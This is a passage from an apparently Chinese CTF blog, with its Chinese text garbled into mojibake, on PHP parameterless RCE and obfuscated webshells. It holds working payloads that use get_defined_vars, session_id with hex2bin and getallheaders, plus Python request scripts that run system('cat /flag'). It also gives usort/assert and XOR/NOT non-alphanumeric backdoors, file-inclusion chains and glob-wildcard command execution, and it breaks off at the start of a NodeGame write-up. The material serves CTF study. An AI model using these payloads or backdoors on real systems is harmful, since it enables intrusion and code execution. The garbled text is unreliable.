<code>current()</code>èµ·åˆ°å–å‡ºæ•°ç»„ç¬¬<br>ä¸€ä¸ªå˜é‡çš„ä½œç”¨ï¼Œæ‰€ä»¥å¯ä»¥ä»¥æ­¤æ›¿ä»£scandirè¦ç”¨çš„ç‚¹ã€‚<br>è¿˜æœ‰ä¸€ç§å¸¸è§„ç‚¹çš„åšæ³•ï¼Œåªéœ€<code>getcwd()</code>å³å¯è¿”å›ç›®å½•ã€‚è€Œ<code>dirname()</code>å¯ä»¥å¾€ç›®å½•ä¸Šè·³ã€‚å½“ç„¶ï¼Œå¦‚æœæƒ³è¯»å–çš„æ–‡ä»¶åœ¨ä¸Šçº§ç›®å½•ï¼Œå°±å¾—å†åŠ ä¸Šä¸€ä¸ª<code>chdir()</code><br>æ¯”å¦‚code-breakngçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç”¨åˆ°çš„array_reverse()ä¹Ÿæ˜¯ä¸ºäº†åº”å¯¹flagçš„æ•°ç»„ç´¢å¼•ä¸æ˜¯ç‰¹æ®Šç´¢å¼•çš„æƒ…å†µã€‚è°ƒæ•´åä½¿ç”¨<code>current, nextï¼Œend</code>å¯ä»¥è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ã€‚</p><p>å½“ç„¶è¿™ç±»æ— å‚RCEè¿˜æœ‰å…¶ä»–ç”¨æ³•ï¼Œæ¯”å¦‚ï¼š<br>1.<code>getenv()</code>å‡½æ•°<br>è¿™ä¸€å‡½æ•°å°†è¿”å›ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œè€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä»è¿™ä¸ªæ•°ç»„ä¸­é€‰å–éœ€è¦çš„å€¼è¿›è¡Œåˆ©ç”¨ã€‚<br>å¸¸å¸¸æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(getenv()));</span><br></pre></td></tr></table></figure><p>å¯ä»¥éšæœºè·å–æ•°ç»„ä¸­æŸä¸€ä¸ªé”®å€¼ã€‚çˆ†ç ´ä¹‹åèƒ½æ‹¿åˆ°æ•°ç»„ä¸­æŒ‡å®šå€¼</p><p>2.<code>getallheaders()</code></p><p>ä»httpå¤´ä¸­è·å–å€¼ã€‚å› æ­¤ååˆ†ä¾¿æ·ã€‚æ¯”å¦‚å½“httpå¤´æœ€åä¸€ä¸ªå€¼ä½¿æˆ‘ä»¬æ„é€ å¥½çš„<code>byc: phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤å³å¯æ‰§è¡Œ<code>phpinfo()</code><br>ä½†æ˜¯æ³¨æ„ï¼Œè¿™æ˜¯ä¸ªapacheå‡½æ•°ï¼Œå¦‚æœé‡åˆ°nginxå°†ä¸å†é€‚ç”¨ã€‚<br>3.<code>get_defined_vars()</code><br>æ­£æ˜¯ä¸ºäº†åº”å¯¹getallheadersçš„ç¼ºé™·ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©<code>get_defined_vars()</code>ã€‚å› ä¸ºå®ƒè¿”å›çš„å°†æ˜¯å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡åŒ…æ‹¬<code>$_GET  $_POST</code>éƒ½æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ã€‚è¿™æ ·æˆ‘ä»¬å°±å¤šäº†ä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚æ¯”å¦‚å–å‡ºäº†_GETçš„è¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;byc=system(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure><p>ç”šè‡³æˆ‘ä»¬ä¹Ÿèƒ½åˆ©ç”¨<code>$_FILES</code>ï¼Œé€šè¿‡ä¼ªé€ æ–‡ä»¶ä¸Šä¼ è¾¾æˆè°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('cat /flag');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'2333!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hex2binæ˜¯ä¸ºäº†é˜²æ­¢å…³é”®å­—çš„è¿‡æ»¤æˆ–è½¬æ¢ã€‚</p><p>4.<code>session_id()</code>å‡½æ•°</p><p>ä¸ä¸Šé¢çš„å…¨å±€å˜é‡åŒæ ·çš„é“ç†ã€‚åªä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„ç‰¹æ€§ã€‚åªè¦æ˜¯<code>PHPSESSID</code>åçš„å€¼ï¼Œå°±å¯ä»¥ç›´æ¥èµ‹ç»™<code>session_id</code>ã€‚æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬åªéœ€è§£å†³<code>session_id</code>å€¼ä¸ºå­—æ¯åŠ æ•°å­—çš„é—®é¢˜äº†ã€‚åŒæ ·ä½¿ç”¨<code>hex2bin</code>å³å¯<br>å‰ææ¡ä»¶æ˜¯è¦å…ˆsession_start()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo '23333';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure><h2 id="èŠ±å¼å†™shell"><a href="#èŠ±å¼å†™shell" class="headerlink" title="èŠ±å¼å†™shell"></a>èŠ±å¼å†™shell</h2><p>èŠ±å¼å†™shellç®—æ˜¯phpä¸€ä¸ªååˆ†è€ƒéªŒæŠ€å·§çš„ç‚¹äº†ã€‚å½“ç„¶ä¹‹å‰ä¸Šé¢linuxéƒ¨åˆ†æ‰€å†™çš„bypassé•¿åº¦ä¹Ÿç®—èŠ±å¼å†™shellã€‚ä½†æ˜¯é‚£ä¸»è¦åˆ©ç”¨çš„æ˜¯linuxçš„ç‰¹æ€§ã€‚æˆ‘ä»¬è¿™é‡Œå°è¯•ä½¿ç”¨phpçš„ç‰¹æ€§ï¼Œå†™å‡ ç§æœ€å¸¸è§çš„webshell</p><p>1.å¸¸è§„æ‹†åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=`$_GET[<span class="number">1</span>]`;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>åŸºæœ¬ç®—æ˜¯ç”¨çƒ‚äº†ï¼Œä¹Ÿæ˜¯æˆ‘è¿™ç§èœé¸¡æœ€å–œæ¬¢ç”¨çš„ç±»å‹ã€‚ç›¸å½“ä¸å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚</p><p>2.include<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><br>å¾ˆå¦™ï¼Œä½†æ˜¯å¯èƒ½ä¼šå—é™äºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚è¿™ä¸ªé€‰é¡¹é»˜è®¤æ˜¯ä¸å¼€å¯çš„ã€‚</p><p>3.includeå‡çº§ç‰ˆ<br>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚ä¸ºæ­¤åªè¦<code>file_put_contents()</code>å†™å…¥ä¸€ä¸ªæ–‡ä»¶å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>file_put_contents</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åã€‚PHPä¼šè®¤ä¸ºNæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä½†ä¹‹å‰å¹¶æ²¡æœ‰å®šä¹‰è¿™ä¸ªå¸¸é‡ï¼Œäºæ˜¯PHPå°±ä¼šæŠŠå®ƒè½¬æ¢æˆå­—ç¬¦ä¸²â€™Nâ€™ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„æ•°æ®ï¼Œaä¹Ÿè¢«è½¬æ¢æˆå­—ç¬¦ä¸²â€™aâ€™ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯flagï¼Œå½“flag=8çš„æ—¶å€™å†…å®¹ä¼šè¿½åŠ åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè€Œä¸æ˜¯è¦†ç›–ã€‚<br>ç”±äºå†™å…¥ç¬¦å·æ—¶å‡½æ•°ä¼šæŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©å†™å…¥payloadçš„base64,åˆ†æ¬¡å†™å…¥ï¼Œæœ€åä¼ªåè®®åŒ…å«ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">0</span>];&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-decode/resource=N</span></span><br></pre></td></tr></table></figure><p>4.å˜é•¿å‚æ•°+å›è°ƒåé—¨</p><p>pç‰›ç»™å‡ºçš„æ— è§†wafçš„ç¥æ‹›ã€‚åˆ©ç”¨äº†php5.6çš„ç‰¹æ€§ã€‚</p><p>åœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ <code>func(...$arr)</code>è¿™æ ·çš„æ–¹å¼ï¼Œå°†$arræ•°ç»„å±•å¼€æˆå¤šä¸ªå‚æ•°ï¼Œä¼ å…¥funcå‡½æ•°ã€‚<br>æ‰€ä»¥å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹å‚æ•°getä¼ å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=phpinfo();&amp;<span class="number">2</span>=assert</span><br></pre></td></tr></table></figure><p>pç‰›è§£é‡Šæ˜¯ï¼š</p><blockquote><p>å¤§æ¦‚è¿‡ç¨‹å°±æ˜¯ï¼ŒGETå˜é‡è¢«å±•å¼€æˆä¸¤ä¸ªå‚æ•°[â€˜testâ€™, â€˜phpinfo();â€™]å’Œassertï¼Œä¼ å…¥usortå‡½æ•°ã€‚usortå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°assertï¼Œå…¶è°ƒç”¨äº†ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„phpinfo();ã€‚ä¿®æ”¹phpinfo();ä¸ºwebshellå³å¯ã€‚</p></blockquote><p>è¿™ä¸ªåšæ³•æœ€å¦™çš„å°±æ˜¯<code>...$_GET</code>ç»•è¿‡wafã€‚</p><h2 id="å†™ç•¸å½¢shell"><a href="#å†™ç•¸å½¢shell" class="headerlink" title="å†™ç•¸å½¢shell"></a>å†™ç•¸å½¢shell</h2><h3 id="phpçš„æŸäº›ç‰¹æ€§"><a href="#phpçš„æŸäº›ç‰¹æ€§" class="headerlink" title="phpçš„æŸäº›ç‰¹æ€§"></a>phpçš„æŸäº›ç‰¹æ€§</h3><p>åº”è¯¥è¯´è¦å…ˆç†Ÿæ‚‰ä¸€ä¸‹phpä¸­å¤§æ‹¬å·çš„å¦™å¤„,å¯å˜å˜é‡çš„å¦™å¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"hello"</span>;</span><br><span class="line">$$a=<span class="string">"world"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="comment">//hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="comment">//hello world</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;_GET&quot;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_GET</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨<code>${}</code>ä¸­ï¼Œå­—ç¬¦ä¸²å¦‚æœä¸å¸¦<code>&#39;&#39; ,&quot; &quot;</code>ã€‚å¹¶ä¸ä¼šå½±å“ç”Ÿæˆä»¥å…¶ä¸ºåçš„å˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$a</span>=1111;</span><br><span class="line">php &gt; var_dump(<span class="variable">$&#123;a&#125;</span>);</span><br><span class="line">PHP Warning:  Use of undefined constant a - assumed <span class="string">'a'</span> (this will throw an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> php shell code on line 1</span><br></pre></td></tr></table></figure><p>å‡å¦‚æˆ‘ä»¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå°±ä¼šå‘ç°å®ƒåœ¨<code>${}</code>ä¸­æ˜¯ä¼šè¢«è§£æçš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'b'</span></span><br><span class="line">$&#123;$a&#125;=&gt;$b</span><br><span class="line">var_dump($&#123;$a&#125;);=&gt;var_dump($b);</span><br><span class="line">$b=<span class="string">'1'</span>=&gt;string(<span class="number">1</span>) <span class="string">"1"</span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ˜ç™½ï¼š<br><code>$$</code>æˆ–<code>${}</code>èƒ½åˆ©ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ›é€ å‡ºä¸€ä¸ªåŒåå˜é‡ã€‚å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼›ä½†æ˜¯<code>${}</code>å¯ä»¥ä½¿å¾—åªåŒ…å«æ•°å­—ï¼Œæ¯”å¦‚<code>${1}</code>ã€‚æ­¤æ—¶<code>${1}</code>å°±å˜æˆäº†ä¸€ä¸ªå˜é‡ã€‚</p><h3 id="å„ç§æ–¹æ³•"><a href="#å„ç§æ–¹æ³•" class="headerlink" title="å„ç§æ–¹æ³•"></a>å„ç§æ–¹æ³•</h3><ol><li>å¼‚æˆ–<br>è¿™ä¸ªæ–¹æ³•å¾ˆå¸¸è§ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ²¡åœ¨å®é™…æ¯”èµ›ä¸­ç”¨åˆ°è¿‡â€¦â€¦<br>ä¸€ä¸ªéæ•°å­—å­—æ¯çš„åé—¨<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br></pre></td></tr></table></figure>å…¶å®å¼‚æˆ–å°±æ˜¯å­—ç¬¦çš„asciiè½¬äºŒè¿›åˆ¶å¼‚æˆ–åå†è½¬asciiè½¬å­—ç¬¦ä¸²ã€‚</li></ol><p>2.å–å<br>èƒ½å¼‚æˆ–å°±èƒ½å–åã€‚ä½è¿ç®—ç‰›bã€‚æ¯”å¦‚pç‰›çš„è¿™ä¸ªä¾‹å­ï¼š<br><code>&#39;å’Œ&#39;{2}</code>çš„ç»“æœ<code>&quot;\x8c&quot;</code>å–åæ˜¯<code>s</code><br>è¿™é‡Œè¿˜åˆ©ç”¨äº†phpä¸­æ•°ç»„å¯ä»¥ä½¿ç”¨<code>{}</code>æ›¿æ¢<code>[]</code>çš„æ€§è´¨ã€‚<br>â€œå’Œâ€çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å€¼ä¸º140[0x8c]ï¼Œå–åçš„å€¼ä¸º-141ã€‚<br>è´Ÿæ•°ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œé€šå¸¸ç”¨çš„æ˜¯è¡¥ç çš„æ–¹å¼è¡¨ç¤ºã€‚è´Ÿæ•°çš„è¡¥ç æ˜¯å®ƒæœ¬èº«çš„å€¼æ¯ä½æ±‚å,æœ€åå†åŠ ä¸€ã€‚141çš„16è¿›åˆ¶ä¸º0xff73ï¼Œphpä¸­chr(0xff73)==115ï¼Œ115å°±æ˜¯sçš„ASCIIå€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(shell)</span>:</span></span><br><span class="line">        hexbit=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">       print(hexbit)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(~(<span class="string">"\x8f\x97\x8f\x96\x91\x99\x90"</span>));</span><br><span class="line">phpinfo</span><br></pre></td></tr></table></figure><p>3.è‡ªå¢è¿ç®—ç¬¦<br>è‡ªå¢è¿ç®—ç¬¦æ„é€ æ•°å­—ä¹Ÿæ˜¯æŠ€å·§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_++;</span><br><span class="line"><span class="keyword">print</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>ä¹Ÿæ˜¯å¯ä»¥å¾—åˆ°<code>2</code>çš„ã€‚è¿™ç‚¹è¿˜å¯ä»¥æ„é€ æ•°ç»„é”®å€¼ã€‚</p><p>4.çŸ­æ ‡ç­¾+é€šé…ç¬¦</p><p>ä¹‹å‰åœ¨ciscnä¸­é‡åˆ°è¿‡ã€‚ä¸€ä¸ª<code>&lt;?php?&gt;</code>ç®—æ˜¯phpçš„é•¿æ ‡ç­¾ï¼Œè€Œ<code>&lt;?=?&gt;</code>ç®—çŸ­æ ‡ç­¾ã€‚ä½†æ˜¯è¿™æ ·å°±å¯ä»¥æ‰§è¡Œå‡½æ•°äº†ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡fuzzè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ç”±äºlinuxä¸­å¯ä»¥ç”¨<code>?</code>æ¥è¿›è¡Œå•ä¸ªå­—æ¯çš„åŒ¹é…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=<span class="variable">$_</span>?&gt;</span><br><span class="line">/bin/cat /var/www/html/index.php</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯åº”ç”¨äº†linuxçš„globé€šé…ç¬¦çš„ä½œç”¨ã€‚æ—¢ç„¶<code>`</code>å¯ä»¥å†…è”æ‰§è¡Œã€‚åªè¦èƒ½åŒ¹é…å®Œå…¨å°±å¯ä»¥è¾¾åˆ°å†™shellå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚<br>å½“ç„¶ï¼Œç¬¦åˆåŒ¹é…ç»“æœçš„å‘½ä»¤å¯èƒ½æœ‰å¤šä¸ªã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Šå…¶ä»–é€šé…ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[^x] è¡¨ç¤ºè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦x</span><br><span class="line">[0-9] è¡¨ç¤ºæ•°å­—èŒƒå›´</span><br><span class="line">[@-[]è¡¨ç¤ºå¤§å†™å­—æ¯</span><br></pre></td></tr></table></figure><p>å‡å¦‚åŒ¹é…åˆ°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>5.php7 åŠ¨æ€å‡½æ•° </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">&#x2F;&#x2F;phpinfo()</span><br></pre></td></tr></table></figure><p>php7å°±æ”¯æŒä½¿ç”¨<code>($a)();</code>è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„</p><p>æš‚ä¸”å†™è¿™ä¹ˆå¤šå§ã€‚æ¯•ç«Ÿphpçš„å¥‡å¦™ä¹‹å¤„å¤ªå¤šäº†ï¼Œä¸€æ—¶åŠä¼šæ˜¯æ€»ç»“ä¸å®Œçš„ã€‚<br>è¿™å‘¨æœ«å°±æ˜¯ç¬¬ä¸€æ¬¡ä»¥X1cçš„é˜Ÿå‘˜èº«ä»½æ‰“æ¯”èµ›äº†ï¼Œè¦åŠ æ²¹å•Šã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a><br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a><br><a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a><br><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å•ç‹¬å¡«å‘-å…¬ç›Šèµ›NodeGame</title>
      <link href="2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/"/>
      <url>2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/</url>
      
        <content type="html"><![CDATA[<p>  ä»Šå¤©æ¥å¡«ä¸‹NodeGameçš„å‘å§ã€‚è¿™é“é¢˜ç¡®å®å‡ºçš„å¾ˆéš¾ã€‚è®°å¾—å½“æ—¶æ¯”èµ›ä¸­ä¹Ÿåªæœ‰å¤§æ¦‚8ä½å¸ˆå‚…åšå‡ºæ¥ã€‚è€Œå®é™…ä¸Šï¼Œå¾ˆå¤šå¸ˆå‚…åº”è¯¥éƒ½æ˜¯æœ‰æ€è·¯ä¸å‚è€ƒé¢˜ç›®ï¼Œä½†æ˜¯æœ€ç»ˆè¢«å°ç»†èŠ‚æ‰€å½±å“çš„ã€‚<br>è¿™é‡Œç»™å‡ºå‡ºé¢˜äººè‡ªå·±çš„å‡ºé¢˜æ€è·¯ï¼š<a href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a><br>å…¶ä¸­ä¸€é“ä»–å‚è€ƒçš„å›½é™…èµ›é¢˜ç›®wp:<br><a href="https://r3billions.com/writeup-split-second/" target="_blank" rel="noopener">https://r3billions.com/writeup-split-second/</a></p><a id="more"></a><h1 id="nullcon-hackim-2020-split-second"><a href="#nullcon-hackim-2020-split-second" class="headerlink" title="nullcon hackim-2020 split-second"></a>nullcon hackim-2020 split-second</h1><p>é¢˜ç›®æºç æˆ‘forkåå•ç‹¬æ”¾åœ¨è‡ªå·±githubä¸Šï¼Œæœ‰éœ€è¦è‡ªå–<br><a href="https://github.com/baiyecha404/hackim-web" target="_blank" rel="noopener">https://github.com/baiyecha404/hackim-web</a></p><p>å…ˆè®²è§£ä¸‹å‡ºé¢˜äººå¸ˆå‚…å‚è€ƒçš„é‚£é“å›½é™…èµ›çš„é¢˜ç›®å§ã€‚<br>é¦–å…ˆé¢˜ç›®çš„è·¯ç”±è·Ÿæˆ‘ä»¬è¿™é“NodeGameåŸºæœ¬ä¸€è‡´ï¼Œé¦–å…ˆä»flagè·¯ç”±å¯ä»¥çœ‹åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 